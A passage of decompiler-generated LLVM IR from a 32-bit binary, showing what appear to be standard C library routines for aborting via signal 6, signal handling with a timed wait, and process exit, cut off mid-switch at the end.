  uselistorder label %dec_label_pc_8051a64, { 1, 0 }
  uselistorder label %dec_label_pc_8051a30, { 1, 0 }
}

define i32 @function_8051b1f() local_unnamed_addr {
dec_label_pc_8051b3a.lr.ph:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_8051b2b = call i32 @function_80520e7(i32 ptrtoint (i32* @global_var_8054318.53 to i32))
  %v12_8051b35 = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_8051b3a48 = add i32 %v12_8051b35, 276
  %v5_8051b3a49 = inttoptr i32 %v4_8051b3a48 to i32*
  store i32 0, i32* %v5_8051b3a49, align 4
  %v0_8051b4550 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051b4551 = add i32 %v0_8051b4550, -1
  %v9_8051b4552 = icmp slt i32 %v1_8051b4551, 0
  store i32 %v1_8051b4551, i32* %eax.global-to-local, align 4
  %v1_8051b4653 = icmp eq i1 %v9_8051b4552, false
  br i1 %v1_8051b4653, label %dec_label_pc_8051b3a.dec_label_pc_8051b3a_crit_edge, label %dec_label_pc_8051b48

dec_label_pc_8051b3a.dec_label_pc_8051b3a_crit_edge: ; preds = %dec_label_pc_8051b3a.lr.ph, %dec_label_pc_8051b3a.dec_label_pc_8051b3a_crit_edge
  %v1_8051b4554 = phi i32 [ %v1_8051b45, %dec_label_pc_8051b3a.dec_label_pc_8051b3a_crit_edge ], [ %v1_8051b4551, %dec_label_pc_8051b3a.lr.ph ]
  %v0_8051b3a.pre = load i32, i32* @esp, align 4
  %v2_8051b3a = mul i32 %v1_8051b4554, 4
  %v3_8051b3a = add i32 %v0_8051b3a.pre, 152
  %v4_8051b3a = add i32 %v3_8051b3a, %v2_8051b3a
  %v5_8051b3a = inttoptr i32 %v4_8051b3a to i32*
  store i32 0, i32* %v5_8051b3a, align 4
  %v0_8051b45 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051b45 = add i32 %v0_8051b45, -1
  %v9_8051b45 = icmp slt i32 %v1_8051b45, 0
  store i32 %v1_8051b45, i32* %eax.global-to-local, align 4
  %v1_8051b46 = icmp eq i1 %v9_8051b45, false
  br i1 %v1_8051b46, label %dec_label_pc_8051b3a.dec_label_pc_8051b3a_crit_edge, label %dec_label_pc_8051b48

dec_label_pc_8051b48:                             ; preds = %dec_label_pc_8051b3a.dec_label_pc_8051b3a_crit_edge, %dec_label_pc_8051b3a.lr.ph
  %v0_8051b48 = load i32, i32* @ebx, align 4
  %v2_8051b4c = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8051b4c, i32* @ebx, align 4
  %v4_8051b54 = call i32 @function_8050b78(i32 %v2_8051b4c, i32 6, i32 %v0_8051b48, i32 %v0_8051b48)
  store i32 %v4_8051b54, i32* %eax.global-to-local, align 4
  %v1_8051b5c = icmp eq i32 %v4_8051b54, 0
  %v1_8051b5e = icmp eq i1 %v1_8051b5c, false
  br i1 %v1_8051b5e, label %dec_label_pc_8051b6e, label %dec_label_pc_8051b60

dec_label_pc_8051b60:                             ; preds = %dec_label_pc_8051b48
  %v3_8051b66 = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_8051b66 = call i32 @function_80504bf(i32 1, %_TYPEDEF_sigset_t* %v3_8051b66, i32 0)
  store i32 %v4_8051b66, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051b6e

dec_label_pc_8051b6e:                             ; preds = %dec_label_pc_8051b48, %dec_label_pc_8051b60
  %v2_8051ba623 = phi i32 [ %v4_8051b54, %dec_label_pc_8051b48 ], [ %v4_8051b66, %dec_label_pc_8051b60 ]
  %v0_8051b6e = load i8, i8* @global_var_80543f4.54, align 4
  %v1_8051b6e = icmp eq i8 %v0_8051b6e, 0
  %v1_8051b75 = icmp eq i1 %v1_8051b6e, false
  br i1 %v1_8051b75, label %dec_label_pc_8051ba6, label %dec_label_pc_8051b77

dec_label_pc_8051b77:                             ; preds = %dec_label_pc_8051b6e
  store i8 1, i8* @global_var_80543f4.54, align 4
  br label %dec_label_pc_8051b7e

dec_label_pc_8051b7e:                             ; preds = %dec_label_pc_8051be5, %dec_label_pc_8051b77
  %v1_8051b86 = call i32 @function_80520e7(i32 ptrtoint (i32* @global_var_8054318.53 to i32))
  store i32 %v1_8051b86, i32* %eax.global-to-local, align 4
  %v1_8051b92 = call i32 @function_8052a65(i32 6)
  store i32 %v1_8051b92, i32* %eax.global-to-local, align 4
  %v1_8051b9e = call i32 @function_80520e7(i32 ptrtoint (i32* @global_var_8054318.53 to i32))
  store i32 %v1_8051b9e, i32* %eax.global-to-local, align 4
  %v0_8051ba6.pre = load i8, i8* @global_var_80543f4.54, align 4
  br label %dec_label_pc_8051ba6

dec_label_pc_8051ba6:                             ; preds = %dec_label_pc_8051b6e, %dec_label_pc_8051b7e
  %v2_8051ba6 = phi i32 [ %v2_8051ba623, %dec_label_pc_8051b6e ], [ %v1_8051b9e, %dec_label_pc_8051b7e ]
  %v0_8051ba6 = phi i8 [ %v0_8051b6e, %dec_label_pc_8051b6e ], [ %v0_8051ba6.pre, %dec_label_pc_8051b7e ]
  %v1_8051ba6 = zext i8 %v0_8051ba6 to i32
  %v3_8051ba6 = and i32 %v2_8051ba6, -256
  %v4_8051ba6 = or i32 %v1_8051ba6, %v3_8051ba6
  store i32 %v4_8051ba6, i32* %eax.global-to-local, align 4
  %v10_8051bab = icmp eq i8 %v0_8051ba6, 1
  %v1_8051bad = icmp eq i1 %v10_8051bab, false
  br i1 %v1_8051bad, label %dec_label_pc_8051c07, label %dec_label_pc_8051bda.lr.ph

dec_label_pc_8051bda.lr.ph:                       ; preds = %dec_label_pc_8051ba6
  store i8 2, i8* @global_var_80543f4.54, align 4
  %v2_8051bbe = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_8051bbe, i32* %eax.global-to-local, align 4
  %v3_8051bc3 = bitcast i32* %stack_var_-272 to i8*
  %v4_8051bc3 = call i32 @function_80507dc(i8* %v3_8051bc3, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_8051bda40 = add i32 %v12_8051b35, 140
  %v5_8051bda41 = inttoptr i32 %v4_8051bda40 to i32*
  store i32 -1, i32* %v5_8051bda41, align 4
  %v0_8051be242 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051be243 = add i32 %v0_8051be242, -1
  %v9_8051be244 = icmp slt i32 %v1_8051be243, 0
  store i32 %v1_8051be243, i32* %eax.global-to-local, align 4
  %v1_8051be345 = icmp eq i1 %v9_8051be244, false
  br i1 %v1_8051be345, label %dec_label_pc_8051bda.dec_label_pc_8051bda_crit_edge, label %dec_label_pc_8051be5

dec_label_pc_8051bda.dec_label_pc_8051bda_crit_edge: ; preds = %dec_label_pc_8051bda.lr.ph, %dec_label_pc_8051bda.dec_label_pc_8051bda_crit_edge
  %v1_8051be246 = phi i32 [ %v1_8051be2, %dec_label_pc_8051bda.dec_label_pc_8051bda_crit_edge ], [ %v1_8051be243, %dec_label_pc_8051bda.lr.ph ]
  %v0_8051bda.pre = load i32, i32* @esp, align 4
  %v2_8051bda = mul i32 %v1_8051be246, 4
  %v3_8051bda = add i32 %v0_8051bda.pre, 16
  %v4_8051bda = add i32 %v3_8051bda, %v2_8051bda
  %v5_8051bda = inttoptr i32 %v4_8051bda to i32*
  store i32 -1, i32* %v5_8051bda, align 4
  %v0_8051be2 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051be2 = add i32 %v0_8051be2, -1
  %v9_8051be2 = icmp slt i32 %v1_8051be2, 0
  store i32 %v1_8051be2, i32* %eax.global-to-local, align 4
  %v1_8051be3 = icmp eq i1 %v9_8051be2, false
  br i1 %v1_8051be3, label %dec_label_pc_8051bda.dec_label_pc_8051bda_crit_edge, label %dec_label_pc_8051be5

dec_label_pc_8051be5:                             ; preds = %dec_label_pc_8051bda.dec_label_pc_8051bda_crit_edge, %dec_label_pc_8051bda.lr.ph
  store i32 %v2_8051bbe, i32* %eax.global-to-local, align 4
  %v4_8051bfa = call i32 @function_8052327(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_8051bfa, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051b7e

dec_label_pc_8051c07:                             ; preds = %dec_label_pc_8051ba6
  %v10_8051c07 = icmp eq i8 %v0_8051ba6, 2
  %v1_8051c09 = icmp eq i1 %v10_8051c07, false
  br i1 %v1_8051c09, label %dec_label_pc_8051c13, label %dec_label_pc_8051c13.thread

dec_label_pc_8051c13.thread:                      ; preds = %dec_label_pc_8051c07
  store i8 3, i8* @global_var_80543f4.54, align 4
  br label %dec_label_pc_8051c1c

dec_label_pc_8051c13:                             ; preds = %dec_label_pc_8051c07
  %v9_8051c13 = icmp eq i8 %v0_8051ba6, 3
  %v1_8051c1a = icmp eq i1 %v9_8051c13, false
  br i1 %v1_8051c1a, label %dec_label_pc_8051c2d, label %dec_label_pc_8051c1c

dec_label_pc_8051c1c:                             ; preds = %dec_label_pc_8051c13.thread, %dec_label_pc_8051c13
  store i8 4, i8* @global_var_80543f4.54, align 4
  %v1_8051c28 = call i32 @function_8052488(i32 127)
  unreachable

dec_label_pc_8051c2d:                             ; preds = %dec_label_pc_8051c13, %dec_label_pc_8051c2d
  br label %dec_label_pc_8051c2d

; uselistorder directives
  uselistorder i32 %v1_8051be2, { 2, 1, 0 }
  uselistorder i32 %v1_8051b45, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 6, 7, 9, 8, 0, 2, 3, 10, 11, 12, 13, 14, 15, 16, 18, 17, 1, 4, 5 }
  uselistorder i8 3, { 4, 5, 0, 1, 2, 3 }
  uselistorder i8 2, { 8, 14, 9, 1, 10, 2, 3, 4, 5, 6, 11, 12, 7, 0, 13 }
  uselistorder i8* @global_var_80543f4.54, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8051c2d, { 1, 0 }
  uselistorder label %dec_label_pc_8051c1c, { 1, 0 }
  uselistorder label %dec_label_pc_8051bda.dec_label_pc_8051bda_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8051ba6, { 1, 0 }
  uselistorder label %dec_label_pc_8051b6e, { 1, 0 }
  uselistorder label %dec_label_pc_8051b3a.dec_label_pc_8051b3a_crit_edge, { 1, 0 }
}

define i32 @function_8051d73(i32 %arg1) local_unnamed_addr {
dec_label_pc_8051d73:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_8051d86 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8051d86, i32* @ebx, align 4
  %v2_8051d8b = call i32 @function_80520ea(i32 %v2_8051d86, i32 134553831)
  %v1_8051d97 = call i32 @function_80520e7(i32 ptrtoint (i32* @global_var_8054330.55 to i32))
  %v0_8051d9c = load i32, i32* @global_var_80543f8.56, align 8
  store i32 %v0_8051d9c, i32* @eax, align 4
  %v1_8051da4 = icmp eq i32 %v0_8051d9c, 0
  br i1 %v1_8051da4, label %dec_label_pc_8051db1, label %dec_label_pc_8051da8

dec_label_pc_8051da8:                             ; preds = %dec_label_pc_8051d73
  %v0_8051dab = load i32, i32* @esi, align 4
  %v1_8051dac = call i32 @unknown_0(i32 %v0_8051dab)
  store i32 %v1_8051dac, i32* @eax, align 4
  br label %dec_label_pc_8051db1

dec_label_pc_8051db1:                             ; preds = %dec_label_pc_8051d73, %dec_label_pc_8051da8
  %v2_8051db6 = call i32 @function_80520ea(i32 %v2_8051d86, i32 1)
  %v0_8051dbb = call i32 @function_80520a8()
  %v0_8051dd4 = load i32, i32* @esi, align 4
  %v1_8051dd5 = call i32 @function_8052488(i32 %v0_8051dd4)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @function_8052488, { 1, 0 }
  uselistorder i32 (i32)* @function_80520e7, { 3, 2, 1, 0, 7, 6, 4, 5, 10, 9, 8 }
  uselistorder i32 (i32, i32)* @function_80520ea, { 1, 0, 9, 8, 7, 6, 5, 2, 4, 3, 13, 12, 11, 10 }
  uselistorder label %dec_label_pc_8051db1, { 1, 0 }
}

define i32 @function_8051dda() local_unnamed_addr {
dec_label_pc_8051dda:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp32 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %v0_8051dda = load i32, i32* @ebp, align 4
  %v0_8051ddb = load i32, i32* @edi, align 4
  %v0_8051ddc = load i32, i32* @esi, align 4
  %v0_8051ddd = load i32, i32* @ebx, align 4
  store i32 32, i32* %eax.global-to-local, align 4
  store i32 %tmp32, i32* %edx.global-to-local, align 4
  %v1_8051df0 = icmp eq i32 %tmp32, 0
  %v1_8051df2 = icmp eq i1 %v1_8051df0, false
  br i1 %v1_8051df2, label %dec_label_pc_8051df9.lr.ph, label %dec_label_pc_8051f51

dec_label_pc_8051df9.lr.ph:                       ; preds = %dec_label_pc_8051dda
  %v15_8051dde = ptrtoint i32* %stack_var_-444 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_8051df956 = add i32 %v15_8051dde, 416
  %v5_8051df957 = inttoptr i32 %v4_8051df956 to i32*
  store i32 0, i32* %v5_8051df957, align 4
  %v0_8051e0458 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051e0459 = add i32 %v0_8051e0458, -1
  %v9_8051e0460 = icmp slt i32 %v1_8051e0459, 0
  store i32 %v1_8051e0459, i32* %eax.global-to-local, align 4
  %v1_8051e0561 = icmp eq i1 %v9_8051e0460, false
  br i1 %v1_8051e0561, label %dec_label_pc_8051df9.dec_label_pc_8051df9_crit_edge, label %dec_label_pc_8051e07

dec_label_pc_8051df9.dec_label_pc_8051df9_crit_edge: ; preds = %dec_label_pc_8051df9.lr.ph, %dec_label_pc_8051df9.dec_label_pc_8051df9_crit_edge
  %v1_8051e0462 = phi i32 [ %v1_8051e04, %dec_label_pc_8051df9.dec_label_pc_8051df9_crit_edge ], [ %v1_8051e0459, %dec_label_pc_8051df9.lr.ph ]
  %v0_8051df9.pre = load i32, i32* @esp, align 4
  %v2_8051df9 = mul i32 %v1_8051e0462, 4
  %v3_8051df9 = add i32 %v0_8051df9.pre, 292
  %v4_8051df9 = add i32 %v3_8051df9, %v2_8051df9
  %v5_8051df9 = inttoptr i32 %v4_8051df9 to i32*
  store i32 0, i32* %v5_8051df9, align 4
  %v0_8051e04 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051e04 = add i32 %v0_8051e04, -1
  %v9_8051e04 = icmp slt i32 %v1_8051e04, 0
  store i32 %v1_8051e04, i32* %eax.global-to-local, align 4
  %v1_8051e05 = icmp eq i1 %v9_8051e04, false
  br i1 %v1_8051e05, label %dec_label_pc_8051df9.dec_label_pc_8051df9_crit_edge, label %dec_label_pc_8051e07

dec_label_pc_8051e07:                             ; preds = %dec_label_pc_8051df9.dec_label_pc_8051df9_crit_edge, %dec_label_pc_8051df9.lr.ph
  %v1_8051e04.lcssa = phi i32 [ %v1_8051e0459, %dec_label_pc_8051df9.lr.ph ], [ %v1_8051e04, %dec_label_pc_8051df9.dec_label_pc_8051df9_crit_edge ]
  store i32 %tmp32, i32* %stack_var_-24, align 4
  %v2_8051e1d = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8051e1d, i32* @ebx, align 4
  store i32 %v2_8051e1d, i32* %stack_var_-460, align 4
  %v4_8051e25 = call i32 @function_8050b78(i32 %v2_8051e1d, i32 17, i32 %v1_8051e04.lcssa, i32 %v1_8051e04.lcssa)
  store i32 %v4_8051e25, i32* %eax.global-to-local, align 4
  %v2_8051e2d = icmp slt i32 %v4_8051e25, 0
  br i1 %v2_8051e2d, label %dec_label_pc_8051f55, label %dec_label_pc_8051e35

dec_label_pc_8051e35:                             ; preds = %dec_label_pc_8051e07
  %v2_8051e36 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_8051e36, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_8051e41 = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_8051e41 = call i32 @function_80504bf(i32 0, %_TYPEDEF_sigset_t* %v3_8051e41, i32 %v2_8051e36)
  store i32 %v4_8051e41, i32* %eax.global-to-local, align 4
  %v1_8051e49 = icmp eq i32 %v4_8051e41, 0
  %v1_8051e4b = icmp eq i1 %v1_8051e49, false
  br i1 %v1_8051e4b, label %dec_label_pc_8051f55, label %dec_label_pc_8051e51

dec_label_pc_8051e51:                             ; preds = %dec_label_pc_8051e35
  store i32 %v2_8051e36, i32* %stack_var_-460, align 4
  %v4_8051e56 = call i32 @function_8050b54(i32 %v2_8051e36, i32 17, i32 %v4_8051e41, i32 %v4_8051e41)
  store i32 %v4_8051e56, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_8051e63 = icmp eq i32 %v4_8051e56, 0
  br i1 %v1_8051e63, label %dec_label_pc_8051e6c.lr.ph, label %dec_label_pc_8051f1f

dec_label_pc_8051e6c.lr.ph:                       ; preds = %dec_label_pc_8051e51
  store i32 31, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v5_8051df957, align 4
  %v0_8051e7750 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051e7751 = add i32 %v0_8051e7750, -1
  %v9_8051e7752 = icmp slt i32 %v1_8051e7751, 0
  store i32 %v1_8051e7751, i32* %edx.global-to-local, align 4
  %v1_8051e7853 = icmp eq i1 %v9_8051e7752, false
  br i1 %v1_8051e7853, label %dec_label_pc_8051e6c.dec_label_pc_8051e6c_crit_edge, label %dec_label_pc_8051e7a

dec_label_pc_8051e6c.dec_label_pc_8051e6c_crit_edge: ; preds = %dec_label_pc_8051e6c.lr.ph, %dec_label_pc_8051e6c.dec_label_pc_8051e6c_crit_edge
  %v1_8051e7754 = phi i32 [ %v1_8051e77, %dec_label_pc_8051e6c.dec_label_pc_8051e6c_crit_edge ], [ %v1_8051e7751, %dec_label_pc_8051e6c.lr.ph ]
  %v0_8051e6c.pre = load i32, i32* @esp, align 4
  %v2_8051e6c = mul i32 %v1_8051e7754, 4
  %v3_8051e6c = add i32 %v0_8051e6c.pre, 292
  %v4_8051e6c = add i32 %v3_8051e6c, %v2_8051e6c
  %v5_8051e6c = inttoptr i32 %v4_8051e6c to i32*
  store i32 0, i32* %v5_8051e6c, align 4
  %v0_8051e77 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051e77 = add i32 %v0_8051e77, -1
  %v9_8051e77 = icmp slt i32 %v1_8051e77, 0
  store i32 %v1_8051e77, i32* %edx.global-to-local, align 4
  %v1_8051e78 = icmp eq i1 %v9_8051e77, false
  br i1 %v1_8051e78, label %dec_label_pc_8051e6c.dec_label_pc_8051e6c_crit_edge, label %dec_label_pc_8051e7a

dec_label_pc_8051e7a:                             ; preds = %dec_label_pc_8051e6c.dec_label_pc_8051e6c_crit_edge, %dec_label_pc_8051e6c.lr.ph
  store i32 %v2_8051e1d, i32* %eax.global-to-local, align 4
  store i32 %v2_8051e1d, i32* %stack_var_-460, align 4
  %v4_8051e86 = call i32 @function_8050b78(i32 %v2_8051e1d, i32 17, i32 0, i32 0)
  store i32 %v4_8051e86, i32* %eax.global-to-local, align 4
  %v2_8051e8e = icmp slt i32 %v4_8051e86, 0
  br i1 %v2_8051e8e, label %dec_label_pc_8051f55, label %dec_label_pc_8051e96

dec_label_pc_8051e96:                             ; preds = %dec_label_pc_8051e7a
  %v2_8051e97 = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_8051e97, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_8051ea0 = call i32 @function_8052327(i32 17, i32* null, i32 %v2_8051e97)
  store i32 %v4_8051ea0, i32* %eax.global-to-local, align 4
  %v2_8051ea8 = icmp slt i32 %v4_8051ea0, 0
  %v1_8051eaa = icmp eq i1 %v2_8051ea8, false
  br i1 %v1_8051eaa, label %dec_label_pc_8051ed4, label %dec_label_pc_8051eac

dec_label_pc_8051eac:                             ; preds = %dec_label_pc_8051e96
  %v0_8051eac = load i32, i32* %stack_var_-460, align 4
  %v1_8051eac = call i32 @function_805078b(i32 %v0_8051eac)
  store i32 %v1_8051eac, i32* %eax.global-to-local, align 4
  store i32 %v1_8051eac, i32* @ebx, align 4
  %v1_8051eb3 = inttoptr i32 %v1_8051eac to i32*
  %v2_8051eb3 = load i32, i32* %v1_8051eb3, align 4
  store i32 %v2_8051eb3, i32* @esi, align 4
  store i32 %v2_8051e36, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8051ec2 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8051ec2 = call i32 @function_80504bf(i32 2, %_TYPEDEF_sigset_t* %v3_8051ec2, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8051ecd = load i32, i32* @esi, align 4
  %v1_8051ecd = load i32, i32* @ebx, align 4
  %v2_8051ecd = inttoptr i32 %v1_8051ecd to i32*
  store i32 %v0_8051ecd, i32* %v2_8051ecd, align 4
  %v0_8051f62.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051f58

dec_label_pc_8051ed4:                             ; preds = %dec_label_pc_8051e96
  %v3_8051ed4 = load i32, i32* %stack_var_-420, align 4
  %v12_8051ed4 = icmp eq i32 %v3_8051ed4, 1
  %v2_8051ee0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8051ee0, i32* @ebx, align 4
  %v1_8051ee7 = icmp eq i1 %v12_8051ed4, false
  br i1 %v1_8051ee7, label %dec_label_pc_8051f0e, label %dec_label_pc_8051ee9

dec_label_pc_8051ee9:                             ; preds = %dec_label_pc_8051ed4
  %v0_8051ee9 = load i32, i32* @edi, align 4
  store i32 %v2_8051ee0, i32* %stack_var_-460, align 4
  %v4_8051eed = bitcast i32* %stack_var_-24 to %timespec*
  %v5_8051eed = call i32 @function_805287f(%timespec* %v4_8051eed, i32 %v2_8051ee0, i32 %v0_8051ee9, i32 %v0_8051ee9)
  store i32 %v5_8051eed, i32* %eax.global-to-local, align 4
  store i32 %v5_8051eed, i32* @edi, align 4
  %v1_8051ef4 = call i32 @function_805078b(i32 %v2_8051ee0)
  store i32 %v1_8051ef4, i32* %eax.global-to-local, align 4
  store i32 %v1_8051ef4, i32* @ebx, align 4
  %v1_8051efe = inttoptr i32 %v1_8051ef4 to i32*
  %v2_8051efe = load i32, i32* %v1_8051efe, align 4
  store i32 %v2_8051efe, i32* @esi, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8051f05 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8051f05 = call i32 @function_80504bf(i32 2, %_TYPEDEF_sigset_t* %v3_8051f05, i32 0)
  store i32 %v4_8051f05, i32* %eax.global-to-local, align 4
  %v0_8051f0a = load i32, i32* @esi, align 4
  %v1_8051f0a = load i32, i32* @ebx, align 4
  %v2_8051f0a = inttoptr i32 %v1_8051f0a to i32*
  store i32 %v0_8051f0a, i32* %v2_8051f0a, align 4
  %v0_8051f34.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051f31

dec_label_pc_8051f0e:                             ; preds = %dec_label_pc_8051ed4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8051f14 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8051f14 = call i32 @function_80504bf(i32 2, %_TYPEDEF_sigset_t* %v3_8051f14, i32 0)
  store i32 %v4_8051f14, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051f2a

dec_label_pc_8051f1f:                             ; preds = %dec_label_pc_8051e51
  %v2_8051f21 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8051f21, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051f2a

dec_label_pc_8051f2a:                             ; preds = %dec_label_pc_8051f0e, %dec_label_pc_8051f1f
  %storemerge3.pre-phi = phi i32 [ %v2_8051ee0, %dec_label_pc_8051f0e ], [ %v2_8051f21, %dec_label_pc_8051f1f ]
  %v3_8051f2a = phi i32 [ %v2_8051e36, %dec_label_pc_8051f0e ], [ %v4_8051e56, %dec_label_pc_8051f1f ]
  %v2_8051f2a = phi i32 [ 0, %dec_label_pc_8051f0e ], [ %v4_8051e56, %dec_label_pc_8051f1f ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v4_8051f2a = bitcast i32* %stack_var_-24 to %timespec*
  %v5_8051f2a = call i32 @function_805287f(%timespec* %v4_8051f2a, i32 %storemerge3.pre-phi, i32 %v2_8051f2a, i32 %v3_8051f2a)
  store i32 %v5_8051f2a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051f31

dec_label_pc_8051f31:                             ; preds = %dec_label_pc_8051ee9, %dec_label_pc_8051f2a
  %v0_8051f34 = phi i32 [ %v0_8051f34.pre, %dec_label_pc_8051ee9 ], [ %v5_8051f2a, %dec_label_pc_8051f2a ]
  %v1_8051f34 = icmp eq i32 %v0_8051f34, 0
  br i1 %v1_8051f34, label %dec_label_pc_8051f51, label %dec_label_pc_8051f38

dec_label_pc_8051f38:                             ; preds = %dec_label_pc_8051f31
  %v4_8051f48 = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_8051f48, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051f58

dec_label_pc_8051f51:                             ; preds = %dec_label_pc_8051dda, %dec_label_pc_8051f31
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051f58

dec_label_pc_8051f55:                             ; preds = %dec_label_pc_8051e7a, %dec_label_pc_8051e35, %dec_label_pc_8051e07
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051f58

dec_label_pc_8051f58:                             ; preds = %dec_label_pc_8051f51, %dec_label_pc_8051f38, %dec_label_pc_8051eac, %dec_label_pc_8051f55
  %v0_8051f62 = phi i32 [ 0, %dec_label_pc_8051f51 ], [ %v4_8051f48, %dec_label_pc_8051f38 ], [ %v0_8051f62.pre, %dec_label_pc_8051eac ], [ -1, %dec_label_pc_8051f55 ]
  store i32 %v0_8051ddd, i32* @ebx, align 4
  store i32 %v0_8051ddc, i32* @esi, align 4
  store i32 %v0_8051ddb, i32* @edi, align 4
  store i32 %v0_8051dda, i32* @ebp, align 4
  ret i32 %v0_8051f62

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 1, 0 }
  uselistorder i32 %v1_8051ef4, { 1, 0, 2 }
  uselistorder i32 %v2_8051ee0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_8051e77, { 2, 1, 0 }
  uselistorder i32 %v4_8051e56, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8051e36, { 0, 2, 4, 3, 1, 5 }
  uselistorder i32 %v2_8051e1d, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_8051e04, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 2, 0, 4, 1, 5, 3 }
  uselistorder i32 %tmp32, { 0, 2, 1 }
  uselistorder i32* %edx.global-to-local, { 3, 5, 4, 0, 1, 2, 6, 7 }
  uselistorder i32* %eax.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 2, 0, 1, 25 }
  uselistorder i32 (i32, i32*, i32)* @function_8052327, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_8050b78, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_8051f58, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8051f51, { 1, 0 }
  uselistorder label %dec_label_pc_8051f31, { 1, 0 }
  uselistorder label %dec_label_pc_8051f2a, { 1, 0 }
  uselistorder label %dec_label_pc_8051e6c.dec_label_pc_8051e6c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8051df9.dec_label_pc_8051df9_crit_edge, { 1, 0 }
}

define i32 @function_8051f63(i32 %arg1) local_unnamed_addr {
dec_label_pc_8051f63:
  switch i32 %arg1, label %dec_label_pc_8051f82 [
    i32 0, label %dec_label_pc_8051f92
    i32 1, label %dec_label_pc_8052077
    i32 2, label %dec_label_pc_8051f9c
    i32 3, label %dec_label_pc_8051fa6
    i32 4, label %dec_label_pc_8051fb0
    i32 5, label %dec_label_pc_8052046
    i32 6, label %dec_label_pc_8051fb8
    i32 7, label %dec_label_pc_8051f78
    i32 8, label %dec_label_pc_8051f78
    i32 9, label %dec_label_pc_8051f78
    i32 10, label %dec_label_pc_8051f78
    i32 11, label %dec_label_pc_8051f78
    i32 12, label %dec_label_pc_8051f78
    i32 13, label %dec_label_pc_8051f78
    i32 14, label %dec_label_pc_8051f78
    i32 15, label %dec_label_pc_8051f78
    i32 16, label %dec_label_pc_8051f78
    i32 17, label %dec_label_pc_8051f78
    i32 18, label %dec_label_pc_8051f78
    i32 19, label %dec_label_pc_8051f78
    i32 20, label %dec_label_pc_8051f78
    i32 21, label %dec_label_pc_8051f78
    i32 22, label %dec_label_pc_8051f78
    i32 23, label %dec_label_pc_8052077
    i32 24, label %dec_label_pc_8052077
